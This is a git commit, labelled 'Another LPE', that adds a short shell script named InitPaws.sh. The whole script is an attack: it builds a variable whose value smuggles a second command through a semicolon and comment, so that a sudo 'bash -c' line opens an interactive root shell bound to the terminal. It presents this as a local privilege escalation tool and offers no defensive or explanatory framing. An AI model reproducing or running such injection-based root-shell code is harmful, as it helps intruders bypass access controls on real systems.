44f6e64aacad712d3b8355a01725f6a54c7ef69e
ZoeyTheArtGirl <sharkplayz1634@gmail.com>
2026-09-09 14:16:04 +0100

    Another LPE.

---
+++ InitPaws.sh
@@ -0,0 +1,9 @@
+
+# History expansion breaks the script, so it needs to leave
+set +H
+
+# Invoke a (root) shell via init
+init_script='/tmp/dummy; /bin/bash < /dev/tty > /dev/tty 2>&1; #'
+
+# Launch the (root) shell
+sudo bash -c "echo '#!/bin/bash' > ${init_script}"
